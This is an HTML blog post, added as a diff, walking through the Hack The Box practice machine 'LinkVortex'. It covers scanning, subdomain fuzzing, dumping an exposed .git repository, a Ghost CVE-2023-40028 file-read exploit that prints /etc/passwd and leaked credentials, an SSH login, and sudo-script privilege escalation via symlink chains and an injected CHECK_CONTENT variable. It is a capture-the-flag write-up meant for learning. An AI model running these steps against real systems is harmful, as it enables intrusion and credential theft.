@@ -1,0 +1,372 @@
+<!doctype html>
+<html lang="en" data-accent="moss" data-f-ga4="G-ZMH6NLL7C7">
+<head>
+<meta charset="UTF-8" />
+	<meta name="viewport" content="width=device-width, initial-scale=1" /><script>try{var t=localStorage.getItem("facet-theme");if(/^(dark|light|auto)$/.test(t))document.documentElement.dataset.theme=t}catch(e){}</script>
+	<meta name="description" content="Hack The Box - LinkVortex" />
+	<meta name="author" content="Shengtuo Hu" />
+	<meta name="theme-color" content="#13161c" media="(prefers-color-scheme: dark)" />
+	<meta name="theme-color" content="#f5f7f9" media="(prefers-color-scheme: light)" />
+	<title>LinkVortex - nu1lptr</title>
+	<link rel="canonical" href="https://shengtuo.me/blog/htb/linkvortex/" /><link rel="icon" href="https://shengtuo.me/favicon.ico" sizes="32x32" />
+	<link rel="icon" href="https://shengtuo.me/favicon.svg" type="image/svg+xml" />
+	<link rel="apple-touch-icon" href="https://shengtuo.me/apple-touch-icon.png" />
+	<link rel="alternate" type="application/rss+xml" title="nu1lptr - RSS Feed" href="https://shengtuo.me/rss.xml" />
+	<link rel="alternate" type="application/atom+xml" title="nu1lptr - Atom Feed" href="https://shengtuo.me/atom.xml" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/facet.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/cast/cast-layered.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/vendor/facet/dist/icons.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/giallo.css" />
+	<link rel="stylesheet" href="https://shengtuo.me/css/site.css" />
+
+	<meta property="og:site_name" content="nu1lptr" /><meta property="og:title" content="LinkVortex" />
+	<meta property="og:url" content="https://shengtuo.me/blog/htb/linkvortex/" />
+	<meta property="og:description" content="Hack The Box - LinkVortex" />
+	<meta property="og:image" content="https://shengtuo.me/cards/blog/htb/linkvortex.png" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="article:published_time" content="2025-08-15T22:09:08-07:00" />
+	<meta property="article:author" content="Shengtuo Hu" />
+	<meta property="article:tag" content="HackTheBox" /><meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:title" content="LinkVortex" />
+	<meta name="twitter:description" content="Hack The Box - LinkVortex" />
+	<meta name="twitter:image" content="https://shengtuo.me/cards/blog/htb/linkvortex.png" />
+	<meta name="twitter:site" content="@ShengtuoHu" />
+	<meta name="twitter:creator" content="@ShengtuoHu" /><script type="application/ld+json">
+{
+	"@context": "https://schema.org",
+	"@type": "BlogPosting",
+	"@id": "https://shengtuo.me/blog/htb/linkvortex/#article",
+	"mainEntityOfPage": "https://shengtuo.me/blog/htb/linkvortex/",
+	"url": "https://shengtuo.me/blog/htb/linkvortex/",
+	"headline": "LinkVortex",
+	"description": "Hack The Box - LinkVortex",
+	"datePublished": "2025-08-15T22:09:08-07:00",
+	"dateModified": "2025-08-15T22:09:08-07:00",
+	"image": "https://shengtuo.me/cards/blog/htb/linkvortex.png",
+	"keywords": ["HackTheBox"],
+	"inLanguage": "en",
+	"author": {
+		"@type": "Person",
+		"@id": "https://shengtuo.me/#person",
+		"name": "Shengtuo Hu",
+		"url": "https://shengtuo.me/"
+	},
+	"publisher": { "@id": "https://shengtuo.me/#person" }
+}
+</script>
+
+
+
+</head>
+<body>
+  <a class="f-visually-hidden" href="#main">Skip to content</a>
+  <nav class="f-nav f-nav--fixed" aria-label="Site">
+  <a class="f-nav__brand" href="https://shengtuo.me">nu1lptr</a>
+  <a href="https://shengtuo.me/blog/" aria-current="page">Blog</a>
+  <a href="https://shengtuo.me/projects/">Projects</a>
+  <a href="https://shengtuo.me/resume/">Resume</a>
+  <button class="f-btn f-btn--quiet site-search-open" type="button" aria-label="Search" title="Search (/)" hidden>
+    <svg class="site-search-icon" viewBox="0 0 24 24" aria-hidden="true"><circle cx="10.5" cy="10.5" r="6.5"/><path d="m15.5 15.5 5 5"/></svg>
+  </button>
+  <button class="f-theme-toggle" type="button" data-f-theme-toggle>Auto</button>
+</nav>
+
+  
+<main id="main" class="f-docs f-prose" data-f-code-ln="true" data-f-code-wrap="true" data-f-code-frame="false">
+  <nav class="f-toc" aria-label="On this page" data-f-scrollspy>
+  <p class="f-docs__label">On this page</p>
+  <a href="#port-scanning">Port Scanning</a>
+  <a href="#subdomain-discovery">Subdomain Discovery</a>
+  <a href="#dump-website-source-code">Dump Website Source Code</a>
+  <a href="#cve-2023-40028">CVE-2023-40028</a>
+  <a href="#ssh-into-the-box">SSH into the Box</a>
+  <a href="#exploit-clean-symlink-sh">Exploit clean_symlink.sh</a>
+  <a href="#reference">Reference</a>
+</nav>
+
+  <article class="site-post">
+<header class="f-reading__title">
+  <p class="f-kicker"><a href="https://shengtuo.me/blog/">nu1lptr&#39;s Blog</a></p>
+  <h1>LinkVortex</h1>
+  <p class="f-meta site-post-meta">
+    <time datetime="2025-08-15">Aug 15, 2025</time> · 2 min read · <a href="https://shengtuo.me/tags/hackthebox/">HackTheBox</a> · <button class="f-btn f-btn--quiet site-share" type="button">Share</button><span class="site-share-status" role="status"></span>
+  </p>
+</header>
+
+    <ul>
+<li>LinkVortex (Easy): <a rel="noopener external" target="_blank" href="https://www.hackthebox.com/machines/linkvortex">https://www.hackthebox.com/machines/linkvortex</a></li>
+<li>My notes: <a rel="noopener external" target="_blank" href="https://github.com/h1994st/HTB/blob/main/LinkVortex/NOTES.md">https://github.com/h1994st/HTB/blob/main/LinkVortex/NOTES.md</a></li>
+</ul>
+<h2 id="port-scanning"><a class="zola-anchor" href="#port-scanning" aria-label="Link to this section">#</a>
+Port Scanning</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A linkvortex.htb</span></span>
+<span class="giallo-l"><span class="z-12">sudo</span><span class="z-6"> nmap -vv -sC -sV -T4 -A dev.linkvortex.htb</span></span></code></pre>
+<p>Note that, we may need to add a reference to <code>/etc/hosts</code> so that we can access both websites.</p>
+<p>Results for <code>linkvortex.htb</code>:</p>
+<pre class="giallo z-code" data-lang="plain" data-wrap="false"><code data-lang="plain" data-wrap="false"><span class="giallo-l"><span>...</span></span>
+<span class="giallo-l"><span>PORT   STATE SERVICE REASON         VERSION</span></span>
+<span class="giallo-l"><span>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="giallo-l"><span>| ssh-hostkey:</span></span>
+<span class="giallo-l"><span>|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)</span></span>
+<span class="giallo-l"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=</span></span>
+<span class="giallo-l"><span>|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)</span></span>
+<span class="giallo-l"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz</span></span>
+<span class="giallo-l"><span>80/tcp open  http    syn-ack ttl 63 Apache httpd</span></span>
+<span class="giallo-l"><span>| http-robots.txt: 4 disallowed entries</span></span>
+<span class="giallo-l"><span>|_/ghost/ /p/ /email/ /r/</span></span>
+<span class="giallo-l"><span>| http-methods:</span></span>
+<span class="giallo-l"><span>|_  Supported Methods: POST GET HEAD OPTIONS</span></span>
+<span class="giallo-l"><span>|_http-favicon: Unknown favicon MD5: A9C6DBDCDC3AE568F4E0DAD92149A0E3</span></span>
+<span class="giallo-l"><span>|_http-server-header: Apache</span></span>
+<span class="giallo-l"><span>|_http-title: BitByBit Hardware</span></span>
+<span class="giallo-l"><span>|_http-generator: Ghost 5.58</span></span>
+<span class="giallo-l"><span>Device type: general purpose|router</span></span>
+<span class="giallo-l"><span>Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span></span>
+<span class="giallo-l"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span></span>
+<span class="giallo-l"><span>OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span></span>
+<span class="giallo-l"><span>TCP/IP fingerprint:</span></span>
+<span class="giallo-l"><span>OS:SCAN(V=7.97%E=4%D=8/15%OT=22%CT=1%CU=30379%PV=Y%DS=2%DC=T%G=Y%TM=689FBA2</span></span>
+<span class="giallo-l"><span>OS:7%P=arm-apple-darwin24.4.0)SEQ(SP=103%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)</span></span>
+<span class="giallo-l"><span>OS:OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552</span></span>
+<span class="giallo-l"><span>OS:ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)</span></span>
+<span class="giallo-l"><span>OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%</span></span>
+<span class="giallo-l"><span>OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T</span></span>
+<span class="giallo-l"><span>OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=</span></span>
+<span class="giallo-l"><span>OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF</span></span>
+<span class="giallo-l"><span>OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40</span></span>
+<span class="giallo-l"><span>OS:%CD=S)</span></span>
+<span class="giallo-l"><span>...</span></span></code></pre>
+<p>Results for <code>dev.linkvortex.htb</code>:</p>
+<pre class="giallo z-code" data-lang="plain" data-wrap="false"><code data-lang="plain" data-wrap="false"><span class="giallo-l"><span>PORT   STATE SERVICE REASON         VERSION</span></span>
+<span class="giallo-l"><span>22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)</span></span>
+<span class="giallo-l"><span>| ssh-hostkey:</span></span>
+<span class="giallo-l"><span>|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)</span></span>
+<span class="giallo-l"><span>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=</span></span>
+<span class="giallo-l"><span>|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)</span></span>
+<span class="giallo-l"><span>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz</span></span>
+<span class="giallo-l"><span>80/tcp open  http    syn-ack ttl 63 Apache httpd</span></span>
+<span class="giallo-l"><span>|_http-server-header: Apache</span></span>
+<span class="giallo-l"><span>| http-git:</span></span>
+<span class="giallo-l"><span>|   10.129.231.194:80/.git/</span></span>
+<span class="giallo-l"><span>|     Git repository found!</span></span>
+<span class="giallo-l"><span>|     Repository description: Unnamed repository; edit this file &#39;description&#39; to name the...</span></span>
+<span class="giallo-l"><span>|     Remotes:</span></span>
+<span class="giallo-l"><span>|_      https://github.com/TryGhost/Ghost.git</span></span>
+<span class="giallo-l"><span>|_http-title: Launching Soon</span></span>
+<span class="giallo-l"><span>| http-methods:</span></span>
+<span class="giallo-l"><span>|_  Supported Methods: GET POST OPTIONS HEAD</span></span>
+<span class="giallo-l"><span>Device type: general purpose</span></span>
+<span class="giallo-l"><span>Running: Linux 4.X|5.X</span></span>
+<span class="giallo-l"><span>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span></span>
+<span class="giallo-l"><span>OS details: Linux 4.15 - 5.19</span></span>
+<span class="giallo-l"><span>TCP/IP fingerprint:</span></span>
+<span class="giallo-l"><span>OS:SCAN(V=7.97%E=4%D=8/15%OT=22%CT=1%CU=31136%PV=Y%DS=2%DC=T%G=Y%TM=689FD34</span></span>
+<span class="giallo-l"><span>OS:9%P=arm-apple-darwin24.4.0)SEQ(SP=F7%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)O</span></span>
+<span class="giallo-l"><span>OS:PS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552S</span></span>
+<span class="giallo-l"><span>OS:T11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E</span></span>
+<span class="giallo-l"><span>OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F</span></span>
+<span class="giallo-l"><span>OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5</span></span>
+<span class="giallo-l"><span>OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z</span></span>
+<span class="giallo-l"><span>OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=</span></span>
+<span class="giallo-l"><span>OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%</span></span>
+<span class="giallo-l"><span>OS:CD=S)</span></span></code></pre><h2 id="subdomain-discovery"><a class="zola-anchor" href="#subdomain-discovery" aria-label="Link to this section">#</a>
+Subdomain Discovery</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">ffuf</span><span class="z-6"> -u http://10.129.231.194 -H</span><span class="z-3"> &quot;</span><span class="z-6">Host: FUZZ.linkvortex.htb</span><span class="z-3">&quot;</span><span class="z-6"> -w ~/Developer/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac</span></span></code></pre>
+<p>Results:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"></span>
+<span class="giallo-l"><span>        /&#39;___\  /&#39;___\           /&#39;___\</span></span>
+<span class="giallo-l"><span>       /\ \__/ /\ \__/  __  __  /\ \__/</span></span>
+<span class="giallo-l"><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span>
+<span class="giallo-l"><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span>
+<span class="giallo-l"><span>         \ \_\   \ \_\  \ \____/  \ \_\</span></span>
+<span class="giallo-l"><span>          \/_/    \/_/   \/___/    \/_/</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>       v2.1.0-dev</span></span>
+<span class="giallo-l"><span>________________________________________________</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span> :: Method           : GET</span></span>
+<span class="giallo-l"><span> :: URL              : http://10.129.231.194</span></span>
+<span class="giallo-l"><span> :: Wordlist         : FUZZ: /Users/tomhu/Developer/SecLists/Discovery/DNS/subdomains-top1million-20000.txt</span></span>
+<span class="giallo-l"><span> :: Header           : Host: FUZZ.linkvortex.htb</span></span>
+<span class="giallo-l"><span> :: Follow redirects : false</span></span>
+<span class="giallo-l"><span> :: Calibration      : true</span></span>
+<span class="giallo-l"><span> :: Timeout          : 10</span></span>
+<span class="giallo-l"><span> :: Threads          : 40</span></span>
+<span class="giallo-l"><span> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span>
+<span class="giallo-l"><span>________________________________________________</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 104ms]</span></span>
+<span class="giallo-l"><span>:: Progress: [19966/19966] :: Job [1/1] :: 447 req/sec :: Duration: [0:00:59] :: Errors: 0 ::</span></span></code></pre><h2 id="dump-website-source-code"><a class="zola-anchor" href="#dump-website-source-code" aria-label="Link to this section">#</a>
+Dump Website Source Code</h2>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">git-dumper</span><span class="z-6"> http://dev.linkvortex.htb/.git ./website</span></span></code></pre>
+<p>In the downloaded source code, we can find a test email and password. Try to login to the main site using them, but unfortunatelly failed. Chaning the email to <code>admin@linkvortex.htb</code> makes it work.</p>
+<div class="f-alert f-alert--info">
+  <p class="f-alert__title">Note</p>
+  <p>Always try the default username/email, or combining with the website domain.</p>
+</div>
+<h2 id="cve-2023-40028"><a class="zola-anchor" href="#cve-2023-40028" aria-label="Link to this section">#</a>
+CVE-2023-40028</h2>
+<p>By searching Ghost 5.58, we can find CVE-2023-40028. We can leverage <a rel="noopener external" target="_blank" href="https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028">this exploit</a>. To make it work, on macOS, we need to set <code>LC_ALL=C</code> while calling <code>tr</code> in the exploit script.</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">bash</span><span class="z-6"> CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/</span></span></code></pre>
+<p>Results:</p>
+<pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>WELCOME TO THE CVE-2023-40028 SHELL</span></span>
+<span class="giallo-l"><span>Enter the file path to read (or type &#39;exit&#39; to quit): /etc/passwd</span></span>
+<span class="giallo-l"><span>File content:</span></span>
+<span class="giallo-l"><span>root:x:0:0:root:/root:/bin/bash</span></span>
+<span class="giallo-l"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>sync:x:4:65534:sync:/bin:/bin/sync</span></span>
+<span class="giallo-l"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span></span>
+<span class="giallo-l"><span>node:x:1000:1000::/home/node:/bin/bash</span></span>
+<span class="giallo-l"><span>Enter the file path to read (or type &#39;exit&#39; to quit): /var/lib/ghost/config.production.json</span></span>
+<span class="giallo-l"><span>File content:</span></span>
+<span class="giallo-l"><span>{</span></span>
+<span class="giallo-l"><span>  &quot;url&quot;: &quot;http://localhost:2368&quot;,</span></span>
+<span class="giallo-l"><span>  &quot;server&quot;: {</span></span>
+<span class="giallo-l"><span>    &quot;port&quot;: 2368,</span></span>
+<span class="giallo-l"><span>    &quot;host&quot;: &quot;::&quot;</span></span>
+<span class="giallo-l"><span>  },</span></span>
+<span class="giallo-l"><span>  &quot;mail&quot;: {</span></span>
+<span class="giallo-l"><span>    &quot;transport&quot;: &quot;Direct&quot;</span></span>
+<span class="giallo-l"><span>  },</span></span>
+<span class="giallo-l"><span>  &quot;logging&quot;: {</span></span>
+<span class="giallo-l"><span>    &quot;transports&quot;: [&quot;stdout&quot;]</span></span>
+<span class="giallo-l"><span>  },</span></span>
+<span class="giallo-l"><span>  &quot;process&quot;: &quot;systemd&quot;,</span></span>
+<span class="giallo-l"><span>  &quot;paths&quot;: {</span></span>
+<span class="giallo-l"><span>    &quot;contentPath&quot;: &quot;/var/lib/ghost/content&quot;</span></span>
+<span class="giallo-l"><span>  },</span></span>
+<span class="giallo-l"><span>  &quot;spam&quot;: {</span></span>
+<span class="giallo-l"><span>    &quot;user_login&quot;: {</span></span>
+<span class="giallo-l"><span>        &quot;minWait&quot;: 1,</span></span>
+<span class="giallo-l"><span>        &quot;maxWait&quot;: 604800000,</span></span>
+<span class="giallo-l"><span>        &quot;freeRetries&quot;: 5000</span></span>
+<span class="giallo-l"><span>    }</span></span>
+<span class="giallo-l"><span>  },</span></span>
+<span class="giallo-l"><span>  &quot;mail&quot;: {</span></span>
+<span class="giallo-l"><span>     &quot;transport&quot;: &quot;SMTP&quot;,</span></span>
+<span class="giallo-l"><span>     &quot;options&quot;: {</span></span>
+<span class="giallo-l"><span>      &quot;service&quot;: &quot;Google&quot;,</span></span>
+<span class="giallo-l"><span>      &quot;host&quot;: &quot;linkvortex.htb&quot;,</span></span>
+<span class="giallo-l"><span>      &quot;port&quot;: 587,</span></span>
+<span class="giallo-l"><span>      &quot;auth&quot;: {</span></span>
+<span class="giallo-l"><span>        &quot;user&quot;: &quot;bob@linkvortex.htb&quot;,</span></span>
+<span class="giallo-l"><span>        &quot;pass&quot;: &quot;fibber-talented-worth&quot;</span></span>
+<span class="giallo-l"><span>        }</span></span>
+<span class="giallo-l"><span>      }</span></span>
+<span class="giallo-l"><span>    }</span></span>
+<span class="giallo-l"><span>}</span></span></code></pre><h2 id="ssh-into-the-box"><a class="zola-anchor" href="#ssh-into-the-box" aria-label="Link to this section">#</a>
+SSH into the Box</h2>
+<p>Now, we have the password for <code>bob</code>. It's easy to login and get the flag.</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-12">sshpass</span><span class="z-6"> -p fibber-talented-worth ssh bob@linkvortex.htb</span></span></code></pre><pre class="giallo z-code" data-lang="plain"><code data-lang="plain"><span class="giallo-l"><span>bob@linkvortex:~$ ls</span></span>
+<span class="giallo-l"><span>user.txt</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>bob@linkvortex:~$ cat user.txt</span></span>
+<span class="giallo-l"><span>ded2e0b8b208ed862a9f39d89b091333</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>bob@linkvortex:~$ sudo -l</span></span>
+<span class="giallo-l"><span>Matching Defaults entries for bob on linkvortex:</span></span>
+<span class="giallo-l"><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>User bob may run the following commands on linkvortex:</span></span>
+<span class="giallo-l"><span>    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png</span></span></code></pre><h2 id="exploit-clean-symlink-sh"><a class="zola-anchor" href="#exploit-clean-symlink-sh" aria-label="Link to this section">#</a>
+Exploit <code>clean_symlink.sh</code></h2>
+<p><code>/opt/ghost/clean_symlink.sh</code>:</p>
+<pre class="giallo z-code" data-lang="shellscript"><code data-lang="shellscript"><span class="giallo-l"><span class="z-1 z-i">#!/bin/bash</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>QUAR_DIR</span><span class="z-3">=&quot;</span><span class="z-6">/var/quarantined</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> [ -z</span><span> $CHECK_CONTENT</span><span class="z-3"> ];</span><span class="z-3 z-i">then</span></span>
+<span class="giallo-l"><span>  CHECK_CONTENT</span><span class="z-3">=</span><span class="z-6">false</span></span>
+<span class="giallo-l"><span class="z-3 z-i">fi</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>LINK</span><span class="z-3">=</span><span class=" z-i">$1</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-3"> ! [[ &quot;</span><span>$LINK</span><span class="z-3">&quot; =~</span><span> \.png$ </span><span class="z-3">]];</span><span class="z-3 z-i"> then</span></span>
+<span class="giallo-l"><span class="z-12">  /usr/bin/echo</span><span class="z-3"> &quot;</span><span class="z-6">! First argument must be a png file !</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-2">  exit</span><span class="z-10"> 2</span></span>
+<span class="giallo-l"><span class="z-3 z-i">fi</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span class="z-3 z-i">if</span><span class="z-12"> /usr/bin/sudo</span><span class="z-6"> /usr/bin/test -L</span><span> $LINK</span><span class="z-3">;</span><span class="z-3 z-i">then</span></span>
+<span class="giallo-l"><span>  LINK_NAME</span><span class="z-3">=$(</span><span class="z-12">/usr/bin/basename</span><span> $LINK</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-1 z-i">  # NOTE: `readlink` won&#39;t recursively resolve the given symbolic link, so we can create a symbolic link chain to bypass this check</span></span>
+<span class="giallo-l"><span class="z-1 z-i">  # e.g., a.png --&gt; b --&gt; /root/root.txt</span></span>
+<span class="giallo-l"><span>  LINK_TARGET</span><span class="z-3">=$(</span><span class="z-12">/usr/bin/readlink</span><span> $LINK</span><span class="z-3">)</span></span>
+<span class="giallo-l"><span class="z-1 z-i">  # NOTE: we check the symbolic link here. After that, we will move the link to the quarantined directory and check the content. Therefore, we can utilize the gap between these two operations to actively override the link in the quarantined directory</span></span>
+<span class="giallo-l"><span class="z-3 z-i">  if</span><span class="z-12"> /usr/bin/echo</span><span class="z-3"> &quot;</span><span>$LINK_TARGET</span><span class="z-3">&quot; |</span><span class="z-12"> /usr/bin/grep</span><span class="z-6"> -Eq</span><span class="z-3"> &#39;</span><span class="z-6">(etc|root)</span><span class="z-3">&#39;;</span><span class="z-3 z-i">then</span></span>
+<span class="giallo-l"><span class="z-12">    /usr/bin/echo</span><span class="z-3"> &quot;</span><span class="z-6">! Trying to read critical files, removing link [ </span><span>$LINK</span><span class="z-6"> ] !</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-12">    /usr/bin/unlink</span><span> $LINK</span></span>
+<span class="giallo-l"><span class="z-3 z-i">  else</span></span>
+<span class="giallo-l"><span class="z-12">    /usr/bin/echo</span><span class="z-3"> &quot;</span><span class="z-6">Link found [ </span><span>$LINK</span><span class="z-6"> ] , moving it to quarantine</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-12">    /usr/bin/mv</span><span> $LINK $QUAR_DIR</span><span class="z-6">/</span></span>
+<span class="giallo-l"><span class="z-1 z-i">    # NOTE: `CHECK_CONTENT` is user-controlled. We can utilize this to execute arbitrary commands</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    if</span><span> $CHECK_CONTENT</span><span class="z-3">;</span><span class="z-3 z-i">then</span></span>
+<span class="giallo-l"><span class="z-12">      /usr/bin/echo</span><span class="z-3"> &quot;</span><span class="z-6">Content:</span><span class="z-3">&quot;</span></span>
+<span class="giallo-l"><span class="z-12">      /usr/bin/cat</span><span> $QUAR_DIR</span><span class="z-6">/</span><span>$LINK_NAME</span><span class="z-3"> 2&gt;</span><span class="z-6">/dev/null</span></span>
+<span class="giallo-l"><span class="z-3 z-i">    fi</span></span>
+<span class="giallo-l"><span class="z-3 z-i">  fi</span></span>
+<span class="giallo-l"><span class="z-3 z-i">fi</span></span></code></pre>
+<p>There are several ways to exploit <code>/opt/ghost/clean_symlink.sh</code></p>
+<ul>
+<li>Double symlinks: create a symbolic link chain, e.g., <code>a.png</code> --&gt; <code>b</code> --&gt; <code>/root/root.txt</code></li>
+<li><code>CHECK_CONTENT</code>: set <code>CHECK_CONTENT</code> to <code>bash</code> to obtain a shell</li>
+<li>TOCTOU (time-of-check time-of-use): initiate a loop to keep overwriting the symbolic link file that will appear in the quarantined directory</li>
+</ul>
+<h2 id="reference"><a class="zola-anchor" href="#reference" aria-label="Link to this section">#</a>
+Reference</h2>
+<ul>
